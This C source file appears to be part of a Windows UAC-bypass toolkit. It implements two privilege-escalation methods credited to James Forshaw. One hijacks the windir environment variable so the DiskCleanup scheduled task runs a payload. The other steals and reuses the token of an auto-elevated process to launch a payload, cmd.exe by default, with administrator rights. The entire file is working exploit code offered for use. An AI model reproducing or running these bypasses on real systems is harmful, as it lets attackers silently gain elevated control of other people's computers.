/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017
*
*  TITLE:       TYRANID.C
*
*  VERSION:     2.73
*
*  DATE:        27 May 2017
*
*  James Forshaw autoelevation method(s)
*  Fine Dinning Tool (c) CIA
*
*  For description please visit original URL
*  https://tyranidslair.blogspot.ru/2017/05/exploiting-environment-variables-in.html
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmDiskCleanupEnvironmentVariable
*
* Purpose:
*
* DiskCleanup task uses current user environment variables to build a path to the executable.
* Warning: this method works with AlwaysNotify UAC level.
*
*/
BOOL ucmDiskCleanupEnvironmentVariable(
    _In_opt_ LPWSTR lpszPayload
)
{
    BOOL    bResult = FALSE, bCond = FALSE;
    LPWSTR  lpBuffer = NULL;
    WCHAR   szBuffer[MAX_PATH + 1];
    WCHAR   szEnvVariable[MAX_PATH * 2];

    do {

        if (lpszPayload != NULL) {
            lpBuffer = lpszPayload;
        }
        else {
            //no payload specified, use default cmd.exe
            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
            lpBuffer = szBuffer;
        }

        //
        // Add quotes.
        //
        szEnvVariable[0] = L'\"';
        szEnvVariable[1] = 0;
        _strncpy(&szEnvVariable[1], MAX_PATH, lpBuffer, MAX_PATH);
        _strcat(szEnvVariable, L"\"");

        //
        // Set our controlled env.variable with payload.
        //
        if (!supSetEnvVariable(FALSE, T_WINDIR, szEnvVariable))
            break;

        //
        // Run trigger task.
        //
        bResult = supRunProcess(SCHTASKS_EXE, T_SCHTASKS_CMD);

        //
        // Cleaup our env.variable.
        //
        supSetEnvVariable(TRUE, T_WINDIR, NULL);

    } while (bCond);

    return bResult;
}

/*
* ucmTokenModification
*
* Purpose:
*
* Obtains the token from an auto-elevated process, modifies it, and reuses it to execute as administrator.
*
*/
BOOL ucmTokenModification(
    _In_opt_ LPWSTR lpszPayload
)
{
    BOOL bCond = FALSE, bResult = FALSE;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    HANDLE hProcessToken = NULL, hDupToken = NULL, hLuaToken = NULL, hImpToken = NULL;

    SID_IDENTIFIER_AUTHORITY MLAuthority = SECURITY_MANDATORY_LABEL_AUTHORITY;
    PSID pIntegritySid = NULL;
    TOKEN_MANDATORY_LABEL tml;
    SECURITY_QUALITY_OF_SERVICE sqos;
    OBJECT_ATTRIBUTES obja;

    LPWSTR lpBuffer = NULL;

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    SHELLEXECUTEINFO shinfo;
    WCHAR szBuffer[MAX_PATH + 1];

    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));

    do {

        if (lpszPayload != NULL) {
            lpBuffer = lpszPayload;
        }
        else {
            //no payload specified, use default cmd.exe
            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
            lpBuffer = szBuffer;
        }

        //
        // Run autoelevated app (any).
        //
        shinfo.cbSize = sizeof(shinfo);
        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        shinfo.lpFile = WUSA_EXE;
        shinfo.nShow = SW_HIDE;
        if (!ShellExecuteEx(&shinfo)) {
#ifdef _INT_DEBUG
            supDebugPrint(
                TEXT("ucmTokenModification->ShellExecute"),
                GetLastError());
#endif
            break;
        }

        //
        // Open token of elevated process.
        //
        Status = NtOpenProcessToken(shinfo.hProcess, MAXIMUM_ALLOWED, &hProcessToken);
        if (!NT_SUCCESS(Status)) {
#ifdef _INT_DEBUG
            supDebugPrint(
                TEXT("ucmTokenModification->NtOpenProcessToken"),
                Status);
#endif
            break;
        }

        //
        // Duplicate primary token.
        //
        sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
        sqos.ImpersonationLevel = SecurityImpersonation;
        sqos.ContextTrackingMode = 0;
        sqos.EffectiveOnly = FALSE;
        InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
        obja.SecurityQualityOfService = &sqos;
        Status = NtDuplicateToken(hProcessToken, TOKEN_ALL_ACCESS, &obja, FALSE, TokenPrimary, &hDupToken);
        if (!NT_SUCCESS(Status)) {
#ifdef _INT_DEBUG
            supDebugPrint(
                TEXT("ucmTokenModification->NtDuplicateToken"),
                Status);
#endif
            break;
        }

        //
        // Lower duplicated token IL from High to Medium.
        //
        Status = RtlAllocateAndInitializeSid(&MLAuthority,
            1, SECURITY_MANDATORY_MEDIUM_RID,
            0, 0, 0, 0, 0, 0, 0,
            &pIntegritySid);
        if (!NT_SUCCESS(Status)) {
#ifdef _INT_DEBUG
            supDebugPrint(
                TEXT("ucmTokenModification->RtlAllocateAndInitializeSid"),
                Status);
#endif
            break;
        }

        tml.Label.Attributes = SE_GROUP_INTEGRITY;
        tml.Label.Sid = pIntegritySid;

        Status = NtSetInformationToken(hDupToken, TokenIntegrityLevel, &tml,
            sizeof(TOKEN_MANDATORY_LABEL) + RtlLengthSid(pIntegritySid));
        if (!NT_SUCCESS(Status)) {
#ifdef _INT_DEBUG
            supDebugPrint(
                TEXT("ucmTokenModification->NtSetInformationToken"),
                Status);
#endif
            break;
        }

        //
        // Create restricted token.
        //
        Status = NtFilterToken(hDupToken, LUA_TOKEN, NULL, NULL, NULL, &hLuaToken);
        if (!NT_SUCCESS(Status)) {
#ifdef _INT_DEBUG
            supDebugPrint(
                TEXT("ucmTokenModification->NtFilterToken"),
                Status);
#endif
            break;
        }

        //
        // Impersonate logged on user.
        //
        hImpToken = NULL;
        Status = NtDuplicateToken(hLuaToken, TOKEN_IMPERSONATE | TOKEN_QUERY,
            &obja,
            FALSE,
            TokenImpersonation,
            &hImpToken);
        if (!NT_SUCCESS(Status)) {
#ifdef _INT_DEBUG
            supDebugPrint(
                TEXT("ucmTokenModification->NtDuplicateToken2"),
                Status);
#endif
            break;
        }

        Status = NtSetInformationThread(
            NtCurrentThread(),
            ThreadImpersonationToken,
            &hImpToken,
            sizeof(HANDLE));

        if (!NT_SUCCESS(Status)) {
#ifdef _INT_DEBUG
            supDebugPrint(
                TEXT("ucmTokenModification->NtSetInformationThread"),
                Status);
#endif
            break;
        }

        NtClose(hImpToken);
        hImpToken = NULL;

        //
        // Run target.
        //
        RtlSecureZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        GetStartupInfo(&si);

        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;

        RtlSecureZeroMemory(&pi, sizeof(pi));

        bResult = CreateProcessWithLogonW(TEXT("uac"), TEXT("is"), TEXT("useless"),
            LOGON_NETCREDENTIALS_ONLY,
            lpBuffer,
            NULL, 0, NULL, NULL,
            &si, &pi);

        if (bResult) {
            if (pi.hThread) CloseHandle(pi.hThread);
            if (pi.hProcess) CloseHandle(pi.hProcess);
        }

        //
        // Revert to self.
        //
        hImpToken = NULL;
        Status = NtSetInformationThread(
            NtCurrentThread(),
            ThreadImpersonationToken,
            (PVOID)&hImpToken,
            sizeof(HANDLE));
        if (!NT_SUCCESS(Status)) {
#ifdef _INT_DEBUG
            supDebugPrint(
                TEXT("ucmTokenModification->NtSetInformationThread2"),
                Status);
#endif
        }

    } while (bCond);

    if (hImpToken) NtClose(hImpToken);
    if (hProcessToken) NtClose(hProcessToken);
    if (hDupToken) NtClose(hDupToken);
    if (hLuaToken) NtClose(hLuaToken);
    if (shinfo.hProcess) NtClose(shinfo.hProcess);
    if (pIntegritySid) RtlFreeSid(pIntegritySid);

    RtlSetLastWin32Error(RtlNtStatusToDosError(Status));
    return bResult;
}
